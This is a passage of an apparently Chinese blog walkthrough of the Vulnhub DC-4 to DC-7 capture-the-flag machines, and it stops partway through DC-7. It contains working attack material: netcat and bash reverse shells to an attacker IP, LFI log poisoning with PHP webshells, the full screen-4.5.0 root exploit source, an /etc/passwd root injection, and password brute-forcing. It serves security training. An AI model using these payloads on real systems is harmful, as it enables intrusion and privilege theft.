<p>进去后查看home目录下有三个用户：charles、jim、sam，其中只有jim用户存在可用信息并找到了一个密码本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc -lvvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.233.134: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.233.128] from (UNKNOWN) [192.168.233.134] 35700</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">ls</span><br><span class="line">command.php</span><br><span class="line">css</span><br><span class="line">images</span><br><span class="line">index.php</span><br><span class="line">login.php</span><br><span class="line">logout.php</span><br><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br><span class="line">ls charles/</span><br><span class="line">ls sam/</span><br><span class="line">ls jim/</span><br><span class="line">backups</span><br><span class="line">mbox</span><br><span class="line">test.sh</span><br><span class="line">ls backups/</span><br><span class="line">old-passwords.bak</span><br><span class="line">cat backups/old-passwords.bak</span><br><span class="line">000000</span><br><span class="line">12345</span><br><span class="line">iloveyou</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>接着我们就利用该密码本成功爆破出该ssh账号密码为 <code>jim/jibril04</code></p>
<p><img src="/../imgs/Vulnhub-DC48.png"></p>
<p>然后我们就可以ssh连上查看jim目录下的mbox，发现是root发的邮件</p>
<p><img src="/../imgs/Vulnhub-DC49.png"></p>
<p>于是我们前往 <code>/var/mail</code> 查看邮件，进而发现 charles 的密码 <code>^xHhA&amp;hvim0y</code></p>
<p><img src="/../imgs/Vulnhub-DC50.png"></p>
<p>然后我们切换到 charles 用户，使用 <code>sudo -l</code> 发现 teehee 用户不用输入密码便可以有root权限</p>
<p><img src="/../imgs/Vulnhub-DC51.png"></p>
<p>于是我们可以利用 teehee 提权，通过 teehee 用户添加一个admin用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure>

<p>最后切换到admin用户即可获取root权限，进而得到flag</p>
<p><img src="/../imgs/Vulnhub-DC52.png"></p>
<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描存活主机和端口，发现开放了80、111、46407端口</p>
<p><img src="/../imgs/Vulnhub-DC53.png"></p>
<blockquote>
<p>其中，111和46407端口存在rpcbind ddos漏洞</p>
<p>该漏洞可使攻击者在远程rpcbind绑定主机上分配任意大小的内存(每次攻击最高可达4GB)，除非进程崩溃，或者管理员挂起&#x2F;重启rpcbind服务，否则该内存不会被释放</p>
</blockquote>
<h2 id="漏洞攻击-3"><a href="#漏洞攻击-3" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/misc/sunrpc_portmapper</span><br><span class="line">set RHOSTS 192.168.150.150</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC54.png"></p>
<p>访问80端口如下：</p>
<p><img src="/../imgs/Vulnhub-DC55.png"></p>
<p>其中<code>Contact</code>模块可以提交数据，随便填一下提交发现被重定向到<code>thankyou.php</code>页面，并且底部的年份也发生了变化，接着尝试包含具有这些参数的文件，可能存在LFI漏洞</p>
<p><img src="/../imgs/Vulnhub-DC56.png"></p>
<p>利用wfuzz来进行测试，发现<code>file</code>参数可以成功文件包含得到<code>/etc/passwd</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.150.150/thankyou.php?FUZZ</span><br><span class="line"> </span><br><span class="line">wfuzz -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u http://192.168.150.150/thankyou.php?file=FUZZ</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC57.png"></p>
<p>接着根据前面得知它用的Nginx服务，而Nginx的默认配置文件位置都保存在<code>/etc/nginx/</code>目录下，所以我们来看一下<code>/etc/nginx/nginx.conf</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># Logging Settings</span><br><span class="line">##</span><br><span class="line"> </span><br><span class="line">access_log /var/log/nginx/access.log;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC58.png"></p>
<p>找到系统日志文件后我们可以发送请求，再利用文件包含系统日志文件去执行命令反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?file=&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br><span class="line">?file=/var/log/nginx/error.log&amp;cmd=bash -i &gt;&amp; /dev/tcp/192.168.150.128/1234 0&gt;&amp;1</span><br><span class="line"># 或者使用nc来反弹</span><br><span class="line">?file=/var/log/nginx/error.log&amp;cmd=nc -e /bin/sh 192.168.150.128 1234</span><br><span class="line"># 也可以写入一句话（不过我这测试没成功</span><br><span class="line">?file=&lt;?php @eval($_POST[&quot;harvey&quot;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC59.png"></p>
<p>然后查看是否有可利用的SUID，查找4000权限发现有个具有SUID权限的异常二进制文件<code>screen-4.5.0</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC60.png"></p>
<p>搜索可以发现screen-4.5.0存在本地提权</p>
<p><img src="/../imgs/Vulnhub-DC61.png"></p>
<p>开启web服务，上传<code>sh</code>文件发现只有在<code>/tmp</code>目录下才有权限，并且执行<code>sh</code>文件时发现它会报错</p>
<p><img src="/../imgs/Vulnhub-DC62.png"></p>
<p>于是查看一下这个<code>sh</code>文件得知它可分为三个部分</p>
<p><img src="/../imgs/Vulnhub-DC63.png"></p>
<p>需要手工编译一下这两个<code>C</code>文件，并修改一下<code>sh</code>文件将前面的内容删除只留下最后一部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># libhax.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta"># rootshell.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">gcc -o rootshell rootshell.c</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># <span class="number">41154.</span>sh</span><br><span class="line">echo <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line">cd /etc</span><br><span class="line">umask <span class="number">000</span> <span class="meta"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="meta"># newline needed</span></span><br><span class="line">echo <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="meta"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC64.png"></p>
<p>再开启web服务上传这三个文件并执行一下sh文件即可提权（不过我这执行出了个问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootshell: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34&#x27; not found (required by /tmp/rootshell)</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC65.png"></p>
<p>再来尝试手工打了一下也是不行</p>
<p><img src="/../imgs/Vulnhub-DC66.png"></p>
<p>应该就是编译的时候glibc版本太高导致的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:/tmp$ objdump -p /tmp/rootshell</span><br><span class="line">objdump -p /tmp/rootshell</span><br><span class="line"> </span><br><span class="line">/tmp/rootshell:     file format elf64-x86-64</span><br><span class="line"> </span><br><span class="line">Program Header:</span><br><span class="line">    PHDR off    0x0000000000000040 vaddr 0x0000000000000040 paddr 0x0000000000000040 align 2**3</span><br><span class="line">         filesz 0x00000000000002d8 memsz 0x00000000000002d8 flags r--</span><br><span class="line">  INTERP off    0x0000000000000318 vaddr 0x0000000000000318 paddr 0x0000000000000318 align 2**0</span><br><span class="line">         filesz 0x000000000000001c memsz 0x000000000000001c flags r--</span><br><span class="line">    LOAD off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**12</span><br><span class="line">         filesz 0x0000000000000700 memsz 0x0000000000000700 flags r--</span><br><span class="line">    LOAD off    0x0000000000001000 vaddr 0x0000000000001000 paddr 0x0000000000001000 align 2**12</span><br><span class="line">         filesz 0x00000000000001e5 memsz 0x00000000000001e5 flags r-x</span><br><span class="line">    LOAD off    0x0000000000002000 vaddr 0x0000000000002000 paddr 0x0000000000002000 align 2**12</span><br><span class="line">         filesz 0x00000000000000e4 memsz 0x00000000000000e4 flags r--</span><br><span class="line">    LOAD off    0x0000000000002de8 vaddr 0x0000000000003de8 paddr 0x0000000000003de8 align 2**12</span><br><span class="line">         filesz 0x0000000000000268 memsz 0x0000000000000270 flags rw-</span><br><span class="line"> DYNAMIC off    0x0000000000002df8 vaddr 0x0000000000003df8 paddr 0x0000000000003df8 align 2**3</span><br><span class="line">         filesz 0x00000000000001e0 memsz 0x00000000000001e0 flags rw-</span><br><span class="line">    NOTE off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3</span><br><span class="line">         filesz 0x0000000000000020 memsz 0x0000000000000020 flags r--</span><br><span class="line">    NOTE off    0x0000000000000358 vaddr 0x0000000000000358 paddr 0x0000000000000358 align 2**2</span><br><span class="line">         filesz 0x0000000000000044 memsz 0x0000000000000044 flags r--</span><br><span class="line">0x6474e553 off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3</span><br><span class="line">         filesz 0x0000000000000020 memsz 0x0000000000000020 flags r--</span><br><span class="line">EH_FRAME off    0x000000000000200c vaddr 0x000000000000200c paddr 0x000000000000200c align 2**2</span><br><span class="line">         filesz 0x000000000000002c memsz 0x000000000000002c flags r--</span><br><span class="line">   STACK off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4</span><br><span class="line">         filesz 0x0000000000000000 memsz 0x0000000000000000 flags rw-</span><br><span class="line">   RELRO off    0x0000000000002de8 vaddr 0x0000000000003de8 paddr 0x0000000000003de8 align 2**0</span><br><span class="line">         filesz 0x0000000000000218 memsz 0x0000000000000218 flags r--</span><br><span class="line"> </span><br><span class="line">Dynamic Section:</span><br><span class="line">  NEEDED               libc.so.6</span><br><span class="line">  INIT                 0x0000000000001000</span><br><span class="line">  FINI                 0x00000000000011dc</span><br><span class="line">  INIT_ARRAY           0x0000000000003de8</span><br><span class="line">  INIT_ARRAYSZ         0x0000000000000008</span><br><span class="line">  FINI_ARRAY           0x0000000000003df0</span><br><span class="line">  FINI_ARRAYSZ         0x0000000000000008</span><br><span class="line">  GNU_HASH             0x00000000000003a0</span><br><span class="line">  STRTAB               0x00000000000004d0</span><br><span class="line">  SYMTAB               0x00000000000003c8</span><br><span class="line">  STRSZ                0x00000000000000ad</span><br><span class="line">  SYMENT               0x0000000000000018</span><br><span class="line">  DEBUG                0x0000000000000000</span><br><span class="line">  PLTGOT               0x0000000000004000</span><br><span class="line">  PLTRELSZ             0x0000000000000078</span><br><span class="line">  PLTREL               0x0000000000000007</span><br><span class="line">  JMPREL               0x0000000000000688</span><br><span class="line">  RELA                 0x00000000000005c8</span><br><span class="line">  RELASZ               0x00000000000000c0</span><br><span class="line">  RELAENT              0x0000000000000018</span><br><span class="line">  FLAGS_1              0x0000000008000000</span><br><span class="line">  VERNEED              0x0000000000000598</span><br><span class="line">  VERNEEDNUM           0x0000000000000001</span><br><span class="line">  VERSYM               0x000000000000057e</span><br><span class="line">  RELACOUNT            0x0000000000000003</span><br><span class="line"> </span><br><span class="line">Version References:</span><br><span class="line">  required from libc.so.6:</span><br><span class="line">    0x09691a75 0x00 03 GLIBC_2.2.5</span><br><span class="line">    0x069691b4 0x00 02 GLIBC_2.34</span><br><span class="line"> </span><br><span class="line">www-data@dc-5:/tmp$ nm /tmp/rootshell | grep GLIBC_2.34</span><br><span class="line">nm /tmp/rootshell | grep GLIBC_2.34</span><br><span class="line">                 U __libc_start_main@GLIBC_2.34</span><br></pre></td></tr></table></figure>

<p>于是换台老一点的再编译上传即可成功提权得到flag</p>
<p><img src="/../imgs/Vulnhub-DC67.png"></p>
<p><img src="/../imgs/Vulnhub-DC68.png"></p>
<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描存活主机和端口，发现开放了22、80端口</p>
<p><img src="/../imgs/Vulnhub-DC69.png"></p>
<p>访问80端口如下：</p>
<p><img src="/../imgs/Vulnhub-DC70.png"></p>
<h2 id="漏洞攻击-4"><a href="#漏洞攻击-4" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><p>于是我们需要修改<code>/etc/hosts</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.150.152 wordy</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC71.png"></p>
<p>再次访问即可看到一个wp的站点，其版本为5.1.1，信息如下：</p>
<p><img src="/../imgs/Vulnhub-DC72.png"></p>
<p>再用dirb扫一下目录啥的，并没有发现什么可以直接利用的</p>
<p><img src="/../imgs/Vulnhub-DC73.png"></p>
<p>接着拿出wpscan跑一下看看，枚举出五个用户admin、mark、graham、sarah、jens</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ --enumerate u</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC74.png"></p>
<p>然后根据所给提示生成字典进行爆破得到用户mark的密码：helpdesk01</p>
<blockquote>
<p><strong>CLUE</strong></p>
<p>OK,  this isn’t really a clue as such, but more of some “we don’t want to  spend five years waiting for a certain process to finish” kind of advice  for those who just want to get on with the job.</p>
<p>cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br><span class="line">wpscan --url http://wordy/ -U dc-6-users.txt -P passwords.txt -t 50</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC75.png"></p>
<p>成功登录后台后发现有个<code>Activity monitor</code>可能存在漏洞</p>
<p><img src="/../imgs/Vulnhub-DC76.png"></p>
<p>搜索发现有个<code>Activity Monitor Command Injection</code>的漏洞，可以直接利用该<code>html</code>文件，修改一下IP和端口即可反弹shell</p>
<p><img src="/../imgs/Vulnhub-DC77.png"></p>
<p>这里我就手工打一下，点击<code>Activity monitor –&gt; Tools –&gt; IP or integer</code>，在<code>IP or integer *</code>处注入一个Linux命令，可以使用<code>|;&amp;</code>成功执行命令</p>
<p><img src="/../imgs/Vulnhub-DC78.png"></p>
<p>于是尝试反弹shell，这里有个长度限制需要f12修改一下长度，成功反弹shell后我们生成一个交互式shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC79.png"></p>
<p>接着在<code>/home/mark/stuff</code>目录下发现<code>things-to-do.txt</code>文本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Things to do:</span><br><span class="line"> </span><br><span class="line">- Restore full functionality for the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present for Sarah&#x27;s farewell party</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br><span class="line">- Apply for the OSCP course</span><br><span class="line">- Buy new laptop for Sarah&#x27;s replacement</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC80.png"></p>
<p>从而我们可以得到的密码：GSo7isUM1D4，尝试ssh成功登录</p>
<p>接着我们发现用户graham可以在没有密码的情况下以jens身份运行backup.sh</p>
<p><img src="/../imgs/Vulnhub-DC81.png"></p>
<p>然后来到<code>/home/jens</code>目录下，将<code>/bin/bash</code>添加到脚本并执行它来切换至jens用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo /bin/bash &gt; backups.sh</span><br><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC82.png"></p>
<p>再来执行一下<code>sudo -l</code>发现可以在没有密码的情况下运行nmap，于是我们就可以通过nmap提权得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; shell</span><br><span class="line">sudo nmap --script=shell</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC83.png"></p>
<h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><h2 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描存活主机和端口，发现开放了22、80端口</p>
<p><img src="/../imgs/Vulnhub-DC84.png"></p>
<p>访问80端口是个Drupal的站点，信息如下：</p>
<p><img src="/../imgs/Vulnhub-DC85.png"></p>
<p>底部有个<code>@DC7USER</code>的用户，根据ID社工搜索一下可以找到有个GitHub和Twitter</p>
<p><img src="/../imgs/Vulnhub-DC86.png"></p>
<p>其中在他的Twitter上我们没有发现任何有用信息，而在他的GitHub上存在一个库**<a target="_blank" rel="noopener" href="https://github.com/Dc7User/staffdb">staffdb</a>**</p>
<p><img src="/../imgs/Vulnhub-DC87.png"></p>
<p>接着在配置文件<code>config.php</code>中得到账密dc7user&#x2F;MdR3xOgB7#dW，于是尝试web登录失败，ssh登录成功</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line">    <span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC88.png"></p>
<p>登录后查看<code>mbox</code>文件发现有个<code>/opt/scripts/backups.sh</code>的脚本在运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span 